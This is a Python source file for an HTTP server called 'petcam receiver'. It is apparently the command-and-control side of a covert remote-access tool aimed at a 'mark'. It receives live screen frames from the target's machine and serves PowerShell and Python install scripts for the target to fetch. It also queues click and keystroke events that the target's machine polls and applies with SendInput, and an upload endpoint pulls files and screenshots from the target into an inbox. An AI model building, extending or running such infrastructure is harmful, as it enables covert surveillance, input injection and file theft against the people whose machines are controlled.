#!/usr/bin/env python3
"""petcam receiver: the HQ-side core. Everything on the 5090 talks to this.

ARCHITECTURE (why it's shaped this way)
  The mark's camera side (ffmpeg/Python OR zero-install .NET PowerShell)
  POSTs raw JPEG frames to /frame. We keep ONLY the newest frame on disk
  (latest.jpg, atomic replace via tmp + os.replace) and hand it out three
  ways:
    /latest.jpg      newest frame, for a browser view + click-mapping
    /stream.mjpeg    multipart/x-mixed-replace loop that mpv plays live
    /state           JSON health for the brain (frame count, age, client)
  The brain (brain.py) polls /state, drives the pet, and pushes SCORE events
  to /control; the mark's camera polls /control?after=N and applies them with
  SendInput ON ITS OWN machine. That's the whole loop, and it's why HQ has no
  dependency on the mark being a "real" client -- only needs to send/receive
  HTTP.

DESIGN CHOICES (judges may ask)
  - Latest-frame-only: 480x270 viewing doesn't need history; one file + a
    counter keeps memory flat no matter how many cameras connect.
  - multipart MJPEG: mpv natively plays `multipart/x-mixed-replace` -- no
    RTSP/WebRTC/UDP needed, so a plain TCP HTTP port is the only thing the
    tailnet has to open.
  - stdlib only: the whole receiver is http.server + json. No framework, so
    `python3 receiver.py` runs anywhere CPython runs (the "multi-OS" claim).
  - ThreadingHTTPServer: the MJPEG stream holds a connection open forever;
    a threaded server keeps /frame POSTs and /state polls responsive.
  - /control is a 32-event seq-numbered deque: the brain pushes, the camera
    polls with after=seq. Bounded + ack-by-cursor = no unbounded backlog and
    no per-event ack RPC.

Binds to the tailscale0 IP only. No Hermes, no deps.
"""
import collections
import json
import os
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HERE = os.path.dirname(os.path.abspath(__file__))
LATEST = os.path.join(HERE, "latest.jpg")
STATE = {"last_frame_at": 0.0, "frames": 0, "last_size": 0, "last_client": "?"}
CLIENT = {"at": 0.0}   # /hello handshake: the sender's real screen bounds + caps
LOCK = threading.Lock()
# Score channel: control events (click/type) the brain forwards for the MARK's
# machine. Senders poll /control?after=seq and apply them with SendInput.
CONTROL = collections.deque(maxlen=32)
CSEQ = 0

PAGE = b"""<!doctype html><meta charset="utf-8"><title>petcam</title>
<body style="margin:0;background:#000;color:#9fe"><pre id=s style="position:fixed;top:0;left:0;font:12px monospace;z-index:2"></pre>
<img id=i src="/latest.jpg?ts=0" style="width:100vw;height:100vh;object-fit:contain">
<script>
async function tick(){
  document.getElementById("i").src = "/latest.jpg?ts=" + Date.now();
  try {
    const r = await (await fetch("/state")).json();
    document.getElementById("s").textContent =
      "frames: " + r.frames + "\\nlast: " +
      new Date(r.last_frame_at * 1000).toLocaleTimeString() +
      "\\nfrom: " + r.last_client;
  } catch (e) {}
  setTimeout(tick, 500);
}
tick();
</script>"""


def read_latest():
    try:
        with open(LATEST, "rb") as f:
            return f.read()
    except FileNotFoundError:
        return None


class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _send(self, code, body, ctype):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path.startswith(("/install", "/send.py", "/petcam-send.py", "/native.ps1", "/petcam-send-native.ps1")):
            name = self.path.split("?")[0].lstrip("/")
            alias = {"install": "install.ps1", "send.py": "petcam-send.py",
                     "native.ps1": "petcam-send-native.ps1"}
            safe = alias.get(name, os.path.basename(name))
            fp = os.path.join(HERE, safe)
            if safe in ("install.ps1", "petcam-send.py", "petcam-send-native.ps1") and os.path.exists(fp):
                with open(fp, "rb") as f:
                    data = f.read()
                self._send(200, data, "text/plain")
            else:
                self._send(404, b"not found", "text/plain")
        elif self.path.startswith("/latest.jpg"):
            data = read_latest()
            if data is None:
                self._send(404, b"no frame yet", "text/plain")
            else:
                self._send(200, data, "image/jpeg")
        elif self.path.startswith("/stream.mjpeg"):
            self.send_response(200)
            self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            with LOCK:
                last_served = STATE["frames"]
            try:
                while True:
                    with LOCK:
                        n = STATE["frames"]
                    if n > last_served:
                        data = read_latest()
                        if data:
                            self.wfile.write(b"--frame\r\n")
                            self.wfile.write(b"Content-Type: image/jpeg\r\n")
                            self.wfile.write(b"Content-Length: " + str(len(data)).encode() + b"\r\n\r\n")
                            self.wfile.write(data)
                            self.wfile.write(b"\r\n")
                            self.wfile.flush()
                            last_served = n
                    else:
                        time.sleep(0.25)
            except (BrokenPipeError, ConnectionResetError, OSError):
                pass
        elif self.path.startswith("/state"):
            with LOCK:
                body = json.dumps(STATE).encode()
            self._send(200, body, "application/json")
        elif self.path.startswith("/client"):
            # The sender's /hello handshake: real screen bounds + capabilities.
            # HQ uses this to verify the feed->screen mapping instead of guessing.
            with LOCK:
                body = json.dumps(CLIENT).encode()
            self._send(200, body, "application/json")
        elif self.path.startswith("/control"):
            # Score channel poll: events after a sequence number (senders apply
            # them with SendInput on the mark's machine; ack by polling onward).
            after = 0
            try:
                qs = self.path.split("?", 1)[1] if "?" in self.path else ""
                for kv in qs.split("&"):
                    if kv.startswith("after="):
                        after = int(kv.split("=", 1)[1])
            except Exception:
                after = 0
            with LOCK:
                STATE["last_control_poll_at"] = time.time()
                STATE["last_control_poll_client"] = self.client_address[0]
                body = json.dumps({"seq": CSEQ,
                                   "events": [e for e in CONTROL if e["seq"] > after]}).encode()
            self._send(200, body, "application/json")
        else:
            self._send(200, PAGE, "text/html")

    def do_POST(self):
        if self.path == "/frame":
            n = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(n)
            if not data or data[:3] != b"\xff\xd8\xff":
                self._send(400, b"not a jpeg", "text/plain")
                return
            tmp = LATEST + ".tmp"
            with open(tmp, "wb") as f:
                f.write(data)
            os.replace(tmp, LATEST)
            with LOCK:
                STATE["last_frame_at"] = time.time()
                STATE["frames"] += 1
                STATE["last_size"] = len(data)
                STATE["last_client"] = self.client_address[0]
            self._send(200, b"ok", "text/plain")
        elif self.path == "/control":
            # Score channel push: brain forwards a click/type (in FEED 1280x720
            # space). Senders poll /control?after=N and apply via SendInput.
            n = int(self.headers.get("Content-Length", 0))
            try:
                evt = json.loads(self.rfile.read(n))
            except Exception:
                self._send(400, b"bad json", "text/plain")
                return
            global CSEQ
            with LOCK:
                CSEQ += 1
                evt["seq"] = CSEQ
                evt["at"] = time.time()
                CONTROL.append(evt)
            self._send(200, json.dumps({"ok": True, "seq": evt["seq"]}).encode(),
                       "application/json")
        elif self.path == "/upload":
            # Mark-to-HQ channel: the remote side POSTs a file (e.g. notes,
            # logs, screenshots) straight to HQ. Saved to inbox/<ts>-<name>.
            n = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(n)
            if not data:
                self._send(400, b"empty body", "text/plain")
                return
            name = os.path.basename(self.headers.get("X-File-Name") or "upload")
            name = "".join(c for c in name if c.isalnum() or c in "-_.")[-60:] or "upload"
            inbox = os.path.join(os.path.dirname(LATEST), "inbox")
            os.makedirs(inbox, exist_ok=True)
            fname = time.strftime("%Y%m%d-%H%M%S-") + name
            with open(os.path.join(inbox, fname), "wb") as f:
                f.write(data)
            self._send(200, ("saved inbox/" + fname).encode(), "text/plain")
        elif self.path == "/hello":
            # Connection handshake from the sender: real screen bounds
            # (virtual + primary), DPI, capabilities. Stored so /client and
            # the brain can verify the feed->screen coordinate mapping.
            n = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(n)
            try:
                info = json.loads(data)
            except Exception:
                self._send(400, b"bad json", "text/plain")
                return
            with LOCK:
                CLIENT.update(info)
                CLIENT["client"] = self.client_address[0]
                CLIENT["at"] = time.time()
            self._send(200, json.dumps({"ok": True}).encode(), "application/json")
        else:
            self._send(404, b"only /frame, /control and /upload", "text/plain")


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "100.86.251.100"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9101
    srv = ThreadingHTTPServer((host, port), H)
    print(f"petcam receiver on {host}:{port} -> {LATEST}", flush=True)
    srv.serve_forever()


if __name__ == "__main__":
    main()
